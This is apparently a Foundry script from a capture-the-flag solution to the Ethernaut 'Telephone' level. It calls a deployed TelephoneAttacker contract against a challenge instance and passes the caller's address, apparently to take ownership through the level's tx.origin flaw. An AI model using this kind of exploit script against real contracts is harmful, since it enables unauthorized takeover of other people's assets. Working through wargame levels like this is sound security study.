// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { TelephoneAttacker } from "../src/05_Telephone/05_TelephoneAttacker.sol";
import { Script } from "forge-std/Script.sol";

contract Attack is Script {

  address constant TELEPHONE_ATTACKER_INSTANCE = 0x37B8dd2434a7412702D04C9aadE977fca54B41b8;
  address constant TELEPHONE_CHALLENGE_INSTANCE = 0x8caea94144fba05935400e2e07e64B925c2fb9d8;
  TelephoneAttacker private attacker = TelephoneAttacker(TELEPHONE_ATTACKER_INSTANCE);

  function run() external {
    vm.startBroadcast();
    attacker.attack(TELEPHONE_CHALLENGE_INSTANCE, msg.sender);
    vm.stopBroadcast();
  }
}